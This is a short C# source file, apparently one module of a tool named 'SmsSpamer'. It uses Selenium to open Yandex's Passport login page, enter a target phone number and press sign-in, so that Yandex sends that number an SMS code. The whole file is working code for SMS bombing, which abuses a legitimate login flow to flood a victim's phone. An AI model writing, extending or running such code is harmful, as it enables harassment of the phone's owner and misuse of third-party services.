using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SmsSpamer.Sites
{
    class Yandex : ISite
    {
        public void SpamSite()
        {
            ISite.browser.Navigate().GoToUrl("https://passport.yandex.ru/auth?backpath=https%3A%2F%2Feda.yandex.ru%2Fmoscow%3FshippingType%3Ddelivery&origin=eats_desktop&retpath=https%3A%2F%2Feda.yandex.ru%2Fmoscow%3Fauth_from%3Dside_menu%26shippingType%3Ddelivery");
            ISite.browser.Manage().Window.Maximize();

            ISite.browser.FindElement(By.XPath("//*[@id='passp-field-login']")).SendKeys(ISite.PhoneNumber);
            IWebElement btn = ISite.browser.FindElement(By.XPath("//*[@id='passp:sign-in']"));
            btn.Click();
        }

    }
}